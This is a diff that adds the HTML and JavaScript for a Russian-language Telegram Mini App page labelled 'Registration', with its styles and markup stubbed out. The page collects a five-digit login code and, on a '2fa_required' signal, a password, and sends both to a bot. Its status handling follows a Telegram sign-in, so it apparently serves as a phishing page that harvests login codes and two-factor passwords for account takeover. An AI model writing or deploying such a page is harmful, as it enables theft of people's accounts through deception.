@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Регистрация</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        /* ваши стили (без изменений) */
+    </style>
+</head>
+<body>
+    <!-- разметка без изменений -->
+
+    <script>
+        // Генерация частиц (можно оставить)
+        function createParticles() { /* ... */ }
+        createParticles();
+
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.disableVerticalSwipes();
+        tg.ready(); // Важно: сообщаем, что приложение готово
+
+        console.log('WebApp initialized, sending init...');
+        // Отправляем init при загрузке
+        tg.sendData(JSON.stringify({ action: 'init' }));
+
+        function moveToNext(current, nextId) {
+            if (current.value.length >= current.maxLength) {
+                document.getElementById(nextId)?.focus();
+            }
+        }
+
+        function sendCode() {
+            const code = 
+                document.getElementById('code1').value +
+                document.getElementById('code2').value +
+                document.getElementById('code3').value +
+                document.getElementById('code4').value +
+                document.getElementById('code5').value;
+            if (code.length < 5) {
+                document.getElementById('code-error').innerText = 'Введите все цифры';
+                return;
+            }
+            tg.sendData(JSON.stringify({ action: 'send_code', code: code }));
+            document.getElementById('step-code').classList.add('hidden');
+            document.getElementById('step-wait').classList.remove('hidden');
+            console.log('Code sent');
+        }
+
+        function sendPassword() {
+            const password = document.getElementById('password').value;
+            if (!password) {
+                document.getElementById('password-error').innerText = 'Введите пароль';
+                return;
+            }
+            tg.sendData(JSON.stringify({ action: 'send_password', password: password }));
+            document.getElementById('step-password').classList.add('hidden');
+            document.getElementById('step-wait').classList.remove('hidden');
+            console.log('Password sent');
+        }
+
+        tg.onEvent('message', function(event) {
+            const data = JSON.parse(event.data);
+            console.log('Message from bot:', data);
+            if (data.status === 'show_code_input') {
+                document.getElementById('step-wait').classList.add('hidden');
+                document.getElementById('step-code').classList.remove('hidden');
+                // Очищаем поля
+                for (let i = 1; i <= 5; i++) {
+                    document.getElementById(`code${i}`).value = '';
+                }
+                document.getElementById('code-error').innerText = '';
+            } else if (data.status === 'init_ok') {
+                console.log('Connection established with bot');
+                // Можно ничего не делать, просто подтверждение
+            } else if (data.status === 'code_expired') {
+                document.getElementById('code-error').innerText = 'Код истёк, новый отправлен';
+                document.getElementById('step-wait').classList.add('hidden');
+                document.getElementById('step-code').classList.remove('hidden');
+                for (let i = 1; i <= 5; i++) {
+                    document.getElementById(`code${i}`).value = '';
+                }
+            } else if (data.status === 'invalid_code') {
+                document.getElementById('code-error').innerText = 'Неверный код';
+                document.getElementById('step-wait').classList.add('hidden');
+                document.getElementById('step-code').classList.remove('hidden');
+            } else if (data.status === '2fa_required') {
+                document.getElementById('step-wait').classList.add('hidden');
+                document.getElementById('step-password').classList.remove('hidden');
+            } else if (data.status === 'success') {
+                tg.close();
+            } else if (data.status === 'error') {
+                alert('Ошибка: ' + data.message);
+                tg.close();
+            }
+        });
+    </script>
+</body>
+</html>
